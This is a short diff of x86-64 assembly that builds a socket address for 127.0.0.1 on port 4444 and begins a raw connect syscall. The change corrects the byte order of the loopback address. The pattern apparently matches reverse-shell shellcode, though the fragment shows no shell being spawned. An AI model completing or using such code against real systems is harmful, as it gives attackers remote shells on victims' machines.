@@ -14,7 +14,7 @@ _start:
         sub rsp, 16
         mov word [rsp], 2
         mov word [rsp+2], 0x5c11
-        mov dword [rsp+4], 0x1000007f
+        mov dword [rsp+4], 0x0100007F
         mov qword [rsp+8], 0
 ; CONNECT
         mov rax, 42
